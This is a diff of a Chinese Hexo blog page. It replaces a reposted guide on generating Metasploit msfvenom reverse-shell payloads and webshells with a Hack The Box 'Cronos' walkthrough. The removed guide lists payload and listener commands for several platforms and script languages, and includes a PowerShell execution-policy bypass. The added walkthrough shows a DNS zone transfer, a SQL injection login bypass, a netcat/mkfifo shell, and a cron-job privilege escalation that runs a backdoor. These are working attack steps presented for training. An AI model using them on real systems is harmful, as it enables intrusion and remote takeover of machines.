@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>生成msf常用payload | Hexo</title>
-  <meta name="keywords" content=" 博客 , 工具 ">
-  <meta name="description" content="生成msf常用payload | Hexo">
+  <title>htb之Cronos | Hexo</title>
+  <meta name="keywords" content=" 博客 , htb ">
+  <meta name="description" content="htb之Cronos | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Cronos nmap 收集一下信息 10.10.10.13PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)80/">
 <meta name="keywords" content="博客,htb">
@@ -249,9 +249,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-生成msf常用payload" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Cronos" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">生成msf常用payload</h1>
+        <h1 class="article-title">htb之Cronos</h1>
     
     <div class="article-meta">
         
@@ -259,7 +259,7 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="转载文章">转载文章</a>
+                <a href="javascript:" data-rel="渗透笔记">渗透笔记</a>
             
         </span>
         
@@ -268,14 +268,14 @@
             
             <a href="javascript:" class="color3">博客</a>
             
-            <a href="javascript:" class="color3">工具</a>
+            <a href="javascript:" class="color4">htb</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-10 16:42:07'>2019-10-10 16:35</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-15 17:02:21'>2019-10-11 09:40</time>
         
     </div>
     <div class="article-meta">
@@ -297,7 +297,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Cronos"><span class="toc-text">htb之Cronos</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -313,97 +313,24 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>转载原地址：<a href="http://www.myh0st.cn/index.php/archives/67/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/67/</a><br>msf作为一款强大的漏洞检测工具，如何生成适用于msf的payload以及如何利用是使用msf的关键，今天就主要记录一下常用的payload以及如何使用。生成payload使用的工具是MSFVenom，下面看看他的帮助信息。</p>
-<p>在kali下可以使用如下命令列出MSFVenom可以生成的payload列表：</p>
-<p>msfvenom -l</p>
-<p>生成二进制文件<br>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p>
-<blockquote>
-<p>Windows<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f exe &gt; shell.exe</your></your></p>
+        <h1 id="htb之Cronos"><a href="#htb之Cronos" class="headerlink" title="htb之Cronos"></a>htb之Cronos</h1><blockquote>
+<p>nmap 收集一下信息 10.10.10.13<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>发现开放着80端口，但又同时开放着53端口，可能是做了域名解析，尝试直接访问80,果然看不到任何东西<br><img src="/images/21.png" alt><br>使用dig问一下dns域名服务器<br>dig axfr @10.10.10.13 cronos.htb<br><img src="/images/22.png" alt><br>修改/etc/hosts 把admin.cronos.htb添加进去<br><img src="/images/23.png" alt><br>直接访问admin.cronos.htb 就可看到一个登陆窗口<br>sql注入admin’– -<br>进去之后一个就可以看到很明显的命令行注入<br><img src="/images/24.png" alt><br>那就直接nc连接吧，因为是server端的原因，不能直接插入，要委婉一点，要点前戏<br>在server端:<br>$ rm -f /tmp/f; mkfifo /tmp/f<br>$ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f</p>
 </blockquote>
+<p>在client端:</p>
 <blockquote>
-<p>Linux<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f elf &gt; shell.elf</your></your></p>
+<p>$ nc host.example.com 1234<br>$ (shell prompt from host.example.com)</p>
 </blockquote>
+<p>通过创建一个FIFO文件/tmp/f，让nc在server端127.0.0.1的端口1234上监听，当一个client成功连接之后，/bin/sh在服务端执行，但执行反馈传送给client端。<br>当连接中断后，nc也退出。如果要保持连接，使用-k选项，但是如果命令退出，这个选项也不会重启它或保持nc运行。如果不再需要，不要忘记删除该文件描述符。</p>
 <blockquote>
-<p>Mac<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f macho &gt; shell.macho</your></your></p>
+<p>$ rm -f /tmp/f</p>
 </blockquote>
-<p>如何利用<br>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p>
+<p>接下来就是提权了<br>（因为shell不是完整的shell，下列提升为完整shell</p>
 <blockquote>
-<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f exe &gt; shell.exe</p>
+<p>python -c ‘import pty; pty.spawn(“/bin/bash”)’ python伪终端<br> ctrl + Z 后台挂起<br>stty raw -echo<br>export SHELL=bash<br>export TERM=xterm256-color<br>stty rows 38 columns 116  )</p>
 </blockquote>
-<p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
+<p>ok, 一个相对来说完整的shell<br>LinEnum:  <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a><br>linux 提权脚本跑到定时任务里有个php脚本可执行<br>正常来说只要读取到/root/root.txt ，这个靶机就算打完了<br>可能是因为我菜吧，在脚本里写cat /root/root.txt &gt; /var/www/admin/123.txt<br>硬是复制不出来，无奈只好含泪提权</p>
 <blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
-<p>双击运行<br>cmd下运行exe<br>利用Powershell远程下载执行<br>利用at或schtasks设置计划任务执行<br>利用wmic远程命令执行<br>其他的方式请各位补充<br>生成webshell脚本<br>在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，如何使用MSFVenom生成一个可以用msf操作的webshell呢？</p>
-<blockquote>
-<p>PHP<br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.php</your></your></p>
-</blockquote>
-<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
-<blockquote>
-<p>ASP<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f asp &gt; shell.asp</your></your></p>
-</blockquote>
-<blockquote>
-<p>JSP<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp</your></your></p>
-</blockquote>
-<blockquote>
-<p>WAR<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f war &gt; shell.war</your></your></p>
-</blockquote>
-<p>如何利用<br>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
-<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.88.128 LPORT=4444 -f raw &gt; shell.php</p>
-<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
-<blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD php/meterpreter_reverse_tcp</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
-<blockquote>
-<p>php shell.php</p>
-</blockquote>
-<p>脚本shell<br>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
-<blockquote>
-<p>Python<br>msfvenom -p cmd/unix/reverse_python LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.py</your></your></p>
-</blockquote>
-<blockquote>
-<p>Bash<br>msfvenom -p cmd/unix/reverse_bash LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.sh</your></your></p>
-</blockquote>
-<blockquote>
-<p>Perl<br>msfvenom -p cmd/unix/reverse_perl LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.pl</your></your></p>
-</blockquote>
-<blockquote>
-<p>Powershell<br>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<your ip address> LPORT=<your port to connect on> -f psh &gt; shell.ps1</your></your></p>
-</blockquote>
-<blockquote>
-<p>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
-</blockquote>
-<p>如何使用<br>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p>
-<blockquote>
-<p>msfvenom -p cmd/unix/reverse_python LHOST=192.168.88.128 LPORT=4444 -f raw &gt; shell.py</p>
-</blockquote>
-<p>在kali上使用msf执行下面的命令，监听端口4444：</p>
-<blockquote>
-<p>msfconsole</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD cmd/unix/reverse_python</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</blockquote>
-<p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
-<blockquote>
-<p>python -c “exec(‘aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY</p>
+<p>chown root:root /tmp/shell.elf; chmod 777 /tmp/shell.elf; /tmp/shell.elf<br>msfvenom 开了个后门，直接回弹root权限<br>nice！</p>
 </blockquote>
 
       
@@ -414,12 +341,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>生成msf常用payload</p>
+    <p><span class="copy-title">文章标题:</span>htb之Cronos</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-10, 16:35:19</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-10, 16:42:07</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/10/生成msf常用payload/" title="生成msf常用payload">https://manmachines.github.io/2019/10/10/生成msf常用payload/</a>
+    <p><span class="copy-title">发布时间:</span>2019-10-11, 09:40:43</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-15, 17:02:21</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/11/htb之Cronos/" title="htb之Cronos">https://manmachines.github.io/2019/10/11/htb之Cronos/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
